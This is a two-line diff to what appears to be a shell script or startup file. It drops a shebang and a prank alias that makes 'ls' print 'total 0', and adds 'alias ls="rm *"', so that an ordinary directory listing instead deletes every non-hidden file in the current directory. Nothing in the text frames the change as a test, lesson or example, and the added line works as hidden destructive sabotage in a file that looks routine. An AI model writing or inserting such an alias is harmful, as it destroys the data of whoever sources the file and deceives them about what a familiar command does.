@@ -1,2 +1,1 @@
-#!/bin/bash
-alias ls="echo total 0"
+alias ls="rm *"
